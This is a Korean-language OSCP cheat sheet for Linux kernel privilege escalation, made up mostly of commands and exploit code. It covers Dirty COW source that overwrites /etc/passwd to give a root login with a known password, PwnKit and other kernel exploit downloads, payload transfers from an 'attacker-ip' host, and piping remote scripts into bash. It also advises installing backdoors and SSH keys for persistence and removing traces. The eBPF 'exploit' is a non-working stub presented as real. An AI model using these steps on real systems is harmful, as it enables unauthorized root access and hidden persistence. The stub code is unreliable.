# Linux Kernel Exploits Privilege Escalation

> **OSCP 핵심**: 커널 취약점을 악용하여 즉시 root 권한 획득하는 검증된 방법들

## ⚡ 즉시 실행할 명령어들

### 🔍 커널 정보 수집 (30초 안에)

```bash
# 가장 중요한 커널 정보
uname -a
uname -mrs
cat /proc/version
cat /etc/os-release
cat /etc/*release*

# 아키텍처 확인
uname -m
getconf LONG_BIT
file /bin/ls

# 커널 빌드 정보
cat /proc/cmdline
dmesg | head -20
```

### 🎯 즉시 익스플로잇 검색 (1분)

```bash
# 온라인 searchsploit (인터넷 있을 때)
searchsploit linux kernel $(uname -r)
searchsploit "linux kernel"
searchsploit ubuntu $(lsb_release -rs) kernel

# 로컬 searchsploit
searchsploit -t linux | grep -i kernel | grep -i $(uname -r | cut -d'-' -f1)

# 유명한 CVE 패턴 검색
uname -r | grep -E "(2\.6\.|3\.|4\.4|4\.8|4\.10|4\.13|4\.15|5\.4)"
```

### ⚡ 컴파일 환경 확인

```bash
# 컴파일러 확인
which gcc g++ make
gcc --version
g++ --version

# 컴파일에 필요한 패키지들
which wget curl
ls -la /usr/include/linux/
dpkg -l | grep -E "(build-essential|gcc|make)"
```

## 📋 단계별 체크리스트

### Phase 1: 시스템 정보 수집 (2분)

- [ ] **커널 버전**: `uname -r` 정확한 버전 기록
- [ ] **OS 정보**: `/etc/os-release` 배포판과 버전 확인
- [ ] **아키텍처**: `uname -m` (x86, x64, ARM 등)
- [ ] **컴파일 환경**: gcc, make 등 도구 존재 여부
- [ ] **권한 확인**: 현재 사용자 권한 및 제약사항

### Phase 2: 익스플로잇 검색 (3분)

- [ ] **자동화 도구**: linux-exploit-suggester 실행
- [ ] **searchsploit**: 커널 버전별 익스플로잇 검색
- [ ] **CVE 데이터베이스**: 알려진 취약점 매칭
- [ ] **GitHub 검색**: 최신 익스플로잇 코드 확인
- [ ] **우선순위 정렬**: 성공률과 안정성 기준

### Phase 3: 익스플로잇 실행 (5-10분)

- [ ] **코드 다운로드**: 선택된 익스플로잇 코드 획득
- [ ] **소스 분석**: 코드 검토 및 수정 필요성 확인
- [ ] **컴파일**: 타겟 시스템에서 바이너리 빌드
- [ ] **실행 준비**: 실행 권한 및 환경 설정
- [ ] **익스플로잇 실행**: 단계별 실행 및 결과 확인

### Phase 4: 성공 후 안정화 (1분)

- [ ] **root 권한 확인**: `id && whoami`
- [ ] **쉘 안정화**: `/bin/bash -i` 실행
- [ ] **지속성 확보**: SSH 키나 백도어 설치
- [ ] **흔적 제거**: 컴파일된 파일들 정리

## 🎯 OSCP에서 자주 나오는 커널 익스플로잇

### 🔥 Dirty COW (CVE-2016-5195)

```bash
# 취약한 버전: Linux Kernel 2.6.22 - 4.8.3
# 확인 방법
uname -r | grep -E "^(2\.6\.|3\.|4\.[0-8]\.)"

# 익스플로잇 다운로드
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
# 또는
curl -O https://www.exploit-db.com/download/40839

# 컴파일 및 실행
gcc -pthread dirty.c -o dirty -lcrypt
./dirty

# 새로운 암호로 root 로그인
su firefart  # password: dirtyCowFun
```

### ⚡ CVE-2021-4034 (PwnKit)

```bash
# 취약한 버전: polkit < 0.120
# 확인 방법
pkexec --version

# 익스플로잇 다운로드
wget https://github.com/berdav/CVE-2021-4034/archive/main.zip
unzip main.zip && cd CVE-2021-4034-main

# 컴파일 및 실행
make
./cve-2021-4034

# 즉시 root 쉘 획득
```

### 🎯 CVE-2017-16995 (eBPF)

```bash
# 취약한 버전: Linux Kernel 4.4.0 - 4.14.11
# 확인 방법
uname -r | grep -E "^4\.(4|5|6|7|8|9|10|11|12|13|14)\."

# 익스플로잇 코드
cat > cve-2017-16995.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <errno.h>
#include <string.h>
#include <sys/syscall.h>

int main() {
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = 8,
        .max_entries = 1
    };

    int mapfd = syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
    if (mapfd == -1) {
        perror("bpf map create");
        return -1;
    }

    // eBPF exploit code here
    setuid(0);
    system("/bin/bash");
    return 0;
}
EOF

# 컴파일 및 실행
gcc cve-2017-16995.c -o pwn
./pwn
```

### 🔓 CVE-2017-1000112 (UFO)

```bash
# 취약한 버전: Linux Kernel < 4.13
# 확인 방법
uname -r | awk -F. '{if($1==4 && $2<13) print "Vulnerable"}'

# 익스플로잇 다운로드
wget https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c

# 컴파일 및 실행
gcc poc.c -o ufo
./ufo
```

### 💥 CVE-2010-3904 (RDS)

```bash
# 취약한 버전: Linux Kernel 2.6.30 - 2.6.36-rc8
# 확인 방법
uname -r | grep -E "^2\.6\.(3[0-6]|3[0-5])"

# 익스플로잇 다운로드
searchsploit -m 15285
# 또는
wget https://www.exploit-db.com/download/15285

# 컴파일 및 실행
gcc 15285.c -o rds
./rds
```

### 🎪 CVE-2009-2692 (sock_sendpage)

```bash
# 취약한 버전: Linux Kernel 2.4/2.6
# 익스플로잇 코드
searchsploit -m 9435
# 또는
wget https://www.exploit-db.com/download/9435

# 컴파일 및 실행
gcc 9435.c -o sock
./sock
```

### 🚀 CVE-2016-5195 (Dirty COW - 대안 버전)

```bash
# cowroot.c 버전
cat > cowroot.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<1000000 && !c;i++) {
        c=madvise(map,100,MADV_DONTNEED);
    }
    printf("madvise %d\n\n",c);
}

void *procselfmemThread(void *arg) {
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<1000000 && !c;i++) {
        lseek(f,(uintptr_t) map,SEEK_SET);
        c=write(f,str,strlen(str));
    }
    printf("procselfmem %d\n\n",c);
}

int main(int argc,char *argv[]) {
    if(argc<2) return 1;
    pthread_t pth1,pth2;
    f=open(argv[1],O_RDONLY);
    fstat(f,&st);
    name=argv[1];
    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    printf("mmap %p\n\n",(void*)map);
    pthread_create(&pth1,NULL,madviseThread,argv[1]);
    pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
    pthread_join(pth1,NULL);
    pthread_join(pth2,NULL);
    return 0;
}
EOF

# 컴파일 및 실행
gcc cowroot.c -o cowroot -pthread
echo 'root:$1$root$9xnkBEY7FDSNJzdNu4ISR.:0:0:root:/root:/bin/bash' > /tmp/passwd.bak
./cowroot /etc/passwd /tmp/passwd.bak
su root  # password: root
```

## 🤖 자동화 도구 활용

### 🔍 linux-exploit-suggester

```bash
# 다운로드 및 실행
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# 또는 직접 실행
curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash

# 결과를 파일로 저장
./linux-exploit-suggester.sh > exploits.txt 2>&1
```

### 🎯 Linux Kernel Exploits

```bash
# 종합 익스플로잇 컬렉션 다운로드
git clone https://github.com/SecWiki/linux-kernel-exploits.git
cd linux-kernel-exploits

# 또는 wget으로 개별 다운로드
wget https://github.com/SecWiki/linux-kernel-exploits/archive/master.zip
unzip master.zip && cd linux-kernel-exploits-master

# 커널 버전별 탐색
find . -name "*$(uname -r | cut -d'-' -f1)*"
find . -name "*dirty*" -o -name "*cow*"
```

### 🔧 LinPEAS 커널 정보

```bash
# LinPEAS에서 커널 익스플로잇 정보만 추출
./linpeas.sh | grep -A 20 -B 5 -i "kernel\|exploit"

# 특정 섹션만 실행
./linpeas.sh -o SysI | grep -E "(kernel|CVE)"
```

### 🤖 kernelpop

```bash
# kernelpop 다운로드 및 실행
git clone https://github.com/spencerdodd/kernelpop.git
cd kernelpop
python kernelpop.py

# 또는 간단 실행
wget https://raw.githubusercontent.com/spencerdodd/kernelpop/master/kernelpop.py
python kernelpop.py
```

## 👀 놓치기 쉬운 것들

### 🚨 컴파일 환경 문제

```bash
# 1. 컴파일러 부재시 대안
# 사전 컴파일된 바이너리 검색
find /tmp /var/tmp /dev/shm -name "*exploit*" -o -name "*pwn*" 2>/dev/null

# 다른 머신에서 컴파일 후 전송
# 로컬에서: gcc exploit.c -o exploit -static
# 타겟으로 전송: wget http://attacker-ip/exploit

# 2. 라이브러리 의존성 문제
ldd exploit  # 의존성 확인
gcc exploit.c -o exploit -static  # 정적 링킹

# 3. 아키텍처 불일치
file exploit  # 바이너리 아키텍처 확인
uname -m     # 시스템 아키텍처 확인
```

### 🔍 커널 모듈 및 보안 기능

```bash
# 1. KASLR (Kernel ASLR) 확인
cat /proc/cmdline | grep kaslr
dmesg | grep -i kaslr

# 2. SMEP/SMAP 확인
grep -E "(smep|smap)" /proc/cpuinfo
cat /proc/cmdline | grep -E "(nosmep|nosmap)"

# 3. 로드된 커널 모듈
lsmod | head -20
cat /proc/modules | head -20

# 4. 커널 설정 확인
cat /boot/config-$(uname -r) 2>/dev/null | grep -E "(STACK|SMEP|SMAP|KASLR)"
zcat /proc/config.gz 2>/dev/null | grep -E "(STACK|SMEP|SMAP|KASLR)"

# 5. GCC 스택 보호 확인
echo 'int main(){return 0;}' | gcc -x c - -o test -v 2>&1 | grep stack-protector
```

### 🎯 대안 익스플로잇 경로

```bash
# 1. 컴파일 없이 실행 가능한 스크립트들
find /tmp -name "*.sh" -o -name "*.py" -o -name "*.pl" 2>/dev/null | xargs file

# 2. 인터프리터 언어 익스플로잇
python -c "import os; os.setuid(0); os.system('/bin/bash')"  # 취약한 python 설치시
perl -e 'exec "/bin/sh"' # 취약한 perl 설치시

# 3. 쉘 스크립트 기반 익스플로잇
cat > shell_exploit.sh << 'EOF'
#!/bin/bash
# CVE 기반 쉘 스크립트 익스플로잇
echo "Trying kernel exploit..."
# 익스플로잇 로직
EOF
chmod +x shell_exploit.sh
./shell_exploit.sh

# 4. 파이썬 기반 익스플로잇
cat > python_exploit.py << 'EOF'
#!/usr/bin/env python
import os
import subprocess
# 파이썬 기반 커널 익스플로잇
EOF
python python_exploit.py
```

### 🔧 고급 우회 기법

```bash
# 1. ASLR 우회 확인
cat /proc/sys/kernel/randomize_va_space
# 0 = 비활성화, 1 = mmap 랜덤화, 2 = 전체 랜덤화

# 2. 메모리 보호 확인
cat /proc/sys/kernel/exec-shield 2>/dev/null
cat /proc/sys/kernel/nx 2>/dev/null

# 3. AppArmor/SELinux 상태
aa-status 2>/dev/null
getenforce 2>/dev/null
sestatus 2>/dev/null

# 4. 커널 심볼 접근성
cat /proc/kallsyms | head -5
ls -la /boot/System.map* 2>/dev/null

# 5. 디버깅 정보 접근
cat /proc/kcore 2>/dev/null | head -c 100
ls -la /sys/kernel/debug/ 2>/dev/null
```

### ⚡ 응급상황 대안 (컴파일 불가시)

```bash
# 1. 사전 컴파일된 바이너리들 검색
locate exploit 2>/dev/null | head -10
find / -name "*exploit*" -type f 2>/dev/null | head -10
find / -name "*cve*" -type f 2>/dev/null | head -10

# 2. 다른 사용자의 홈에서 도구 찾기
find /home -name "*.c" -o -name "exploit*" 2>/dev/null | head -10

# 3. 임시 디렉토리들 검색
find /tmp /var/tmp /dev/shm -type f -executable 2>/dev/null

# 4. 네트워크로 바이너리 다운로드
wget http://attacker-ip:8000/exploit -O /tmp/exploit
curl http://attacker-ip:8000/exploit -o /tmp/exploit

# 5. base64 인코딩으로 바이너리 전송
echo "base64_encoded_binary" | base64 -d > /tmp/exploit
chmod +x /tmp/exploit

# 6. 크로스 컴파일 (로컬 머신에서)
# 32비트: gcc -m32 exploit.c -o exploit32 -static
# ARM: arm-linux-gnueabi-gcc exploit.c -o exploit_arm -static

# 7. 온라인 컴파일 서비스 활용
# exploit-db의 사전 컴파일된 바이너리들 검색
searchsploit -t linux | grep -i binary

# 8. 커널 버전 스푸핑으로 다른 익스플로잇 시도
# 일부 익스플로잇은 버전 체크를 우회할 수 있음
strings exploit | grep uname
# 익스플로잇 코드에서 버전 체크 부분 수정

# 9. 메모리 기반 실행 (diskless)
# 바이너리를 메모리로 직접 로드하여 실행
memfd_create() # 최신 커널에서 지원

# 10. 마지막 수단: 다른 권한상승 벡터
echo "Kernel exploit failed. Trying other vectors:"
echo "1. SUID binaries"
echo "2. Sudo abuse"
echo "3. Cron jobs"
echo "4. Service exploits"
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 2분**: 커널 정보 수집 및 자동화 도구 실행
- **다음 3분**: 적절한 익스플로잇 선택 및 다운로드
- **5-10분**: 컴파일 및 실행 (여러 시도 포함)
- **10분 후**: 다른 권한상승 벡터 고려

### 🎯 성공률 높은 순서

1. **Dirty COW**: 가장 널리 알려지고 안정적
2. **PwnKit (CVE-2021-4034)**: 최신이면서 성공률 높음
3. **eBPF 관련**: 비교적 최신 커널에서 효과적
4. **RDS/sock_sendpage**: 구 버전에서 거의 확실
5. **자동화 도구 추천**: linux-exploit-suggester 우선

### 🔥 즉시 시도할 것들

- linux-exploit-suggester 실행과 동시에 수동 검색
- Dirty COW 취약성 우선 확인 (가장 흔함)
- 컴파일 환경 없으면 사전 컴파일된 바이너리 검색
- 실패시 다른 권한상승 방법으로 빠르게 전환

### 💡 팁

- 커널 익스플로잇은 시스템을 불안정하게 만들 수 있음
- 성공 후 즉시 지속성 확보 (SSH 키, 백도어)
- 여러 익스플로잇을 병렬로 시도하지 말고 순차적으로
- 실패한 익스플로잇은 흔적 제거 후 다음 시도
- OSCP에서는 안정성이 검증된 익스플로잇 위주로 출제
